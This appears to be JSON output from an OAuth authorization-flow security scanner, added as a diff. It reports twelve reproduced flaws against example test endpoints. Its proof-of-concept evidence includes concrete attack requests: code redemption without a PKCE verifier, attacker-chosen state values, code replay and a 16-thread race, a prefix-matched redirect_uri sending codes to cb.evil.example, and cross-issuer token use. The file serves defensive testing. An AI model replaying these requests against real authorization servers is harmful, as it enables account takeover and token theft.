@@ -1,0 +1,325 @@
+{
+  "tool": "auth_state_engine",
+  "version": "1.0.0",
+  "target": {},
+  "exploitable": true,
+  "summary": "12 finding(s) — 12 reproduced live",
+  "machine": {
+    "inference": "prefix_tree (live traces)",
+    "states": 6,
+    "edges": 11,
+    "alphabet": [
+      "authorize",
+      "code_consume",
+      "token_present"
+    ]
+  },
+  "findings": [
+    {
+      "id": "VF-AUTH-001",
+      "severity": "high",
+      "title": "Grant accepted without its proof of possession / outside its audience",
+      "flaw": "D1",
+      "reproduced": true,
+      "evidence": {
+        "claim": "code redeemable with code_verifier ABSENT although code_challenge was sent at authorize",
+        "authorize": {
+          "request": "GET /authA/authorize?login=victime&redirect_uri=https%3A%2F%2Fapp.example%2Fcb&state=s-v1&code_challenge=DIlPZak5JkgwEzYG90Xj4zNa2-jMXtIhPmgMiw0CCIw&code_challenge_method=S256",
+          "status": 302,
+          "location": "https://app.example/cb?code=55752750&state=s-v1",
+          "body": {}
+        },
+        "exchange": {
+          "request": "GET /token?code=55752750",
+          "status": 200,
+          "location": null,
+          "body": {
+            "access_token": "19837af526cda3ac09d84012e31880a8f28222286af34c1c4ff4ceaa35341df9",
+            "token_type": "Bearer",
+            "iss": "https://issuer-a.example"
+          }
+        },
+        "token_issued": true
+      }
+    },
+    {
+      "id": "VF-AUTH-002",
+      "severity": "critical",
+      "title": "Protected transition reachable without required proof (step-skip)",
+      "flaw": "D2",
+      "reproduced": true,
+      "evidence": {
+        "claim": "server issues code and echoes an attacker-chosen state without ANY session binding; machine has no state_verify transition (no-skip P1 gap)",
+        "authorize": {
+          "request": "GET /authA/authorize?login=victime&redirect_uri=https%3A%2F%2Fapp.example%2Fcb&state=ATTACKER-STATE-NEVER-MINTED-9f27",
+          "status": 302,
+          "location": "https://app.example/cb?code=f9786d5e&state=ATTACKER-STATE-NEVER-MINTED-9f27",
+          "body": {}
+        },
+        "state_echoed": "ATTACKER-STATE-NEVER-MINTED-9f27",
+        "unbound_state_accepted": true
+      }
+    },
+    {
+      "id": "VF-AUTH-003",
+      "severity": "high",
+      "title": "Single-use token consumed more than once (non-atomic guard)",
+      "flaw": "D3",
+      "reproduced": true,
+      "evidence": {
+        "claim": "same code exchanged twice → two distinct tokens",
+        "exchange_1": 200,
+        "exchange_2": 200,
+        "distinct_tokens": true,
+        "token1_prefix": "300e42ab4150f758",
+        "token2_prefix": "08a7ce0b2225c774"
+      }
+    },
+    {
+      "id": "VF-AUTH-004",
+      "severity": "high",
+      "title": "redirect_uri validated by prefix — code leakage path",
+      "flaw": "D4",
+      "reproduced": true,
+      "evidence": {
+        "claim": "prefix validation accepted evil sibling domain — code + state leak to attacker-controlled origin",
+        "authorize": {
+          "request": "GET /authA/authorize?login=victime&redirect_uri=https%3A%2F%2Fapp.example%2Fcb.evil.example&state=s-v4",
+          "status": 302,
+          "location": "https://app.example/cb.evil.example?code=161ae042&state=s-v4",
+          "body": {}
+        },
+        "leaked_code_prefix": "161ae042",
+        "location": "https://app.example/cb.evil.example?code=161ae042&state=s-v4"
+      }
+    },
+    {
+      "id": "VF-AUTH-005",
+      "severity": "high",
+      "title": "Token below the entropy floor (H = L·log2|C| < min)",
+      "flaw": "D5",
+      "reproduced": true,
+      "evidence": {
+        "claim": "H = L·log2|C| = 32.0 bits (< 160) on 100 live codes",
+        "entropy_report": {
+          "label": "authorization code",
+          "charset": "hex",
+          "length": 8,
+          "nominal_bits": 32.0,
+          "empirical_bits_sample": 3.0,
+          "min_bits": 160.0,
+          "verdict": "FAIL",
+          "method": "H = L·log2|C|"
+        },
+        "distinct_of_sample": "100/100",
+        "sample_codes": [
+          "3bda57f8",
+          "9e18518d",
+          "b7e22147",
+          "2dbd8d01",
+          "8fb06710"
+        ]
+      }
+    },
+    {
+      "id": "VF-AUTH-006",
+      "severity": "critical",
+      "title": "Token accepted outside its bound issuer (mix-up surface)",
+      "flaw": "D6",
+      "reproduced": true,
+      "evidence": {
+        "claim": "token issued by issuer-B accepted by the resource server of issuer-A (no iss/aud enforcement — mix-up surface)",
+        "authorize_issuer_b": {
+          "request": "GET /authB/authorize?login=victime&redirect_uri=https%3A%2F%2Fapp.example%2Fcb&state=s-v6",
+          "status": 302,
+          "location": "https://app.example/cb?code=c3913b57&state=s-v6",
+          "body": {}
+        },
+        "token_iss": "https://issuer-b.example",
+        "rs_exchange": {
+          "request": "GET /api/user",
+          "status": 200,
+          "location": null,
+          "body": {
+            "sub": "victime",
+            "iss": "https://issuer-b.example",
+            "note": "issued by whoever — nobody checks"
+          }
+        },
+        "rs_note": "issued by whoever — nobody checks"
+      }
+    },
+    {
+      "id": "VF-AUTH-007",
+      "severity": "high",
+      "title": "Grant accepted without its proof of possession / outside its audience",
+      "flaw": "D6",
+      "reproduced": true,
+      "evidence": {
+        "claim": "binding preservation violated: τ.iss ∉ allowed(RS)",
+        "token_iss": "https://issuer-b.example",
+        "allowed": [
+          "https://issuer-a.example"
+        ],
+        "poc": {
+          "request": "GET /api/user",
+          "status": 200,
+          "location": null,
+          "body": {
+            "sub": "victime",
+            "iss": "https://issuer-b.example",
+            "note": "issued by whoever — nobody checks"
+          }
+        }
+      }
+    },
+    {
+      "id": "VF-AUTH-008",
+      "severity": "high",
+      "title": "Single-use token consumed more than once (non-atomic guard)",
+      "flaw": "D3-race",
+      "reproduced": true,
+      "evidence": {
+        "claim": "concurrent exchanges of ONE code all succeeded",
+        "race": {
+          "mode": "executed_threads",
+          "threads": 16,
+          "success_2xx": 16,
+          "distinct_tokens": 16,
+          "wall_ms": 1037.4,
+          "model": "P = 1−(1−p)^k per attempt (dossier §6.5)",
+          "interpretation": "single-use guard ABSENT — open door, not a window",
+          "bodies_sample": [
+            {
+              "access_token": "253135eedfbd4d638926f66092aeb9f3bf8e2d64a2efd522d1629140e801c3dd",
+              "token_type": "Bearer",
+              "iss": "https://issuer-a.example"
+            },
+            {
+              "access_token": "abad1a70aed77e3149b6e4f2aad6d26197c7ecdf0a4341a75422722bbce525c5",
+              "token_type": "Bearer",
+              "iss": "https://issuer-a.example"
+            }
+          ]
+        }
+      }
+    },
+    {
+      "id": "VF-AUTH-009",
+      "severity": "critical",
+      "title": "Protected transition reachable without required proof (step-skip)",
+      "template": "no_skip",
+      "property": "□(code_consume → ◇state_verify)",
+      "trace": "d2-state-unbound",
+      "evidence": {
+        "gap": "code exchanged with NO state-verification transition anywhere in the observed machine",
+        "observed_sequence": [
+          "authorize",
+          "code_consume"
+        ]
+      },
+      "flaw": "D2(monitor-pass)",
+      "reproduced": true
+    },
+    {
+      "id": "VF-AUTH-010",
+      "severity": "high",
+      "title": "Grant accepted without its proof of possession / outside its audience",
+      "template": "binding_preservation",
+      "property": "□(grant(code) → ∃verifier: SHA256(verifier)=challenge ∧ code↔challenge bound)",
+      "trace": "d1-pkce-binding",
+      "evidence": {
+        "verifier_sent": false,
+        "note": "code redeemed with NO proof of possession",
+        "poc": {
+          "authorize": {
+            "request": "GET /authA/authorize?login=victime&redirect_uri=https%3A%2F%2Fapp.example%2Fcb&state=s-v1&code_challenge=DIlPZak5JkgwEzYG90Xj4zNa2-jMXtIhPmgMiw0CCIw&code_challenge_method=S256",
+            "status": 302,
+            "location": "https://app.example/cb?code=55752750&state=s-v1",
+            "body": {}
+          },
+          "exchange": {
+            "request": "GET /token?code=55752750",
+            "status": 200,
+            "location": null,
+            "body": {
+              "access_token": "19837af526cda3ac09d84012e31880a8f28222286af34c1c4ff4ceaa35341df9",
+              "token_type": "Bearer",
+              "iss": "https://issuer-a.example"
+            }
+          }
+        }
+      },
+      "flaw": "D1(monitor-pass)",
+      "reproduced": true
+    },
+    {
+      "id": "VF-AUTH-011",
+      "severity": "high",
+      "title": "Single-use token consumed more than once (non-atomic guard)",
+      "template": "no_replay",
+      "property": "□(consume(c) → X□¬consume(c))",
+      "trace": "d3-code-replay",
+      "evidence": {
+        "event": "code_consume",
+        "token_id": "7aeb0679",
+        "successful_consumes": 2
+      },
+      "impact": "non-atomic single-use guard — race window (dossier §6.5: P = 1−(1−p)^k)",
+      "flaw": "D3(monitor-pass)",
+      "reproduced": true
+    },
+    {
+      "id": "VF-AUTH-012",
+      "severity": "critical",
+      "title": "Token accepted outside its bound issuer (mix-up surface)",
+      "template": "issuer_confinement",
+      "property": "□(token_use(u,τ) → τ.iss ∈ allowed(route))",
+      "trace": "d6-mixup-audience",
+      "evidence": {
+        "route": "/api/user",
+        "token_iss": "https://issuer-b.example",
+        "allowed": [
+          "https://issuer-a.example"
+        ],
+        "rs_note": "issued by whoever — nobody checks"
+      },
+      "verdict": "FOREIGN_ISSUER_TOKEN_ACCEPTED",
+      "flaw": "D6(monitor-pass)",
+      "reproduced": true
+    }
+  ],
+  "entropy": [
+    {
+      "label": "authorization code",
+      "charset": "hex",
+      "length": 8,
+      "nominal_bits": 32.0,
+      "empirical_bits_sample": 3.0,
+      "min_bits": 160.0,
+      "verdict": "FAIL",
+      "method": "H = L·log2|C|"
+    }
+  ],
+  "race": {
+    "mode": "executed_threads",
+    "threads": 16,
+    "success_2xx": 16,
+    "distinct_tokens": 16,
+    "wall_ms": 1037.4,
+    "model": "P = 1−(1−p)^k per attempt (dossier §6.5)",
+    "interpretation": "single-use guard ABSENT — open door, not a window",
+    "bodies_sample": [
+      {
+        "access_token": "253135eedfbd4d638926f66092aeb9f3bf8e2d64a2efd522d1629140e801c3dd",
+        "token_type": "Bearer",
+        "iss": "https://issuer-a.example"
+      },
+      {
+        "access_token": "abad1a70aed77e3149b6e4f2aad6d26197c7ecdf0a4341a75422722bbce525c5",
+        "token_type": "Bearer",
+        "iss": "https://issuer-a.example"
+      }
+    ]
+  }
+}
